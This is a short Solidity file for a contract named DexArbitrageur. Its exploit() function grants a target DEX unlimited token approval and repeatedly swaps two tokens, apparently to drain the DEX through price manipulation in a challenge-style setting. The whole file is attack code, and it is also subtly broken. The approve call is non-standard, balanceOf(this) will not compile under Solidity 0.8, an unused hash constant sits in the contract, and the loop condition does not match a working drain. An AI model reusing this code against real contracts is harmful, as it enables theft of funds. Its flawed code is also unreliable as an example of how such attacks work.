pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address owner, address spender, uint256 amount) external;
}

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract DexArbitrageur {
    IDex target;
    address token1;
    address token2;
    bytes32 public constant TYPE_HASH = 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925;

    constructor(address _target) {
        target = IDex(_target);
        token1 = target.token1();
        token2 = target.token2();
    }

    function exploit() public {
        IERC20(token1).approve(token1, target, type(uint).max);
        IERC20(token2).approve(token2, target, type(uint).max);

        while (IERC20(token1).balanceOf(this) > 0 || IERC20(token2).balanceOf(this) > 0) {
            uint256 t1 = IERC20(token1).balanceOf(this);
            if (t1 > 0) {
                target.swap(token1, token2, t1);
                uint256 t2 = IERC20(token2).balanceOf(this);
                if (t2 > 0) target.swap(token2, token1, t2);
            } else if (IERC20(token2).balanceOf(this) > 0) {
                target.swap(token2, token1, IERC20(token2).balanceOf(this));
            }
        }
    }
}